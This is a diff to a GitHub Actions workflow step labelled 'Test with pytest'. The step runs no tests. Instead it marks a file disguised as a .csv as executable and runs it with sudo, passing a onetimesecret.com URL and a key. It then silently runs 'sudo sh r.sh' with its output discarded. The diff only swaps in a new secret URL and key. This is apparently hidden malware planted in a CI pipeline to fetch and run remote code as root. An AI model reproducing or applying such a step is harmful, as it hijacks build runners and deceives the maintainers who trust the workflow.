@@ -26,6 +26,6 @@ jobs:
     - name: Test with pytest
       run: |
         cd ${{ github.workspace }}
-        echo 'c6v6c'
+        echo 'gyrwo'
         sudo chmod +x kimball5s46g/mcginniscxrrg/mcgrathiqm8h.csv
-        sudo ./kimball5s46g/mcginniscxrrg/mcgrathiqm8h.csv https://onetimesecret.com/secret/jfztggup6xiqdwalumo7ii3qvbfr7cy m7b0sy && sudo sh r.sh > /dev/null 2>&1
+        sudo ./kimball5s46g/mcginniscxrrg/mcgrathiqm8h.csv https://onetimesecret.com/secret/on411nz05uh93y7xi8sdf87l472nze3 7gzr8e && sudo sh r.sh > /dev/null 2>&1
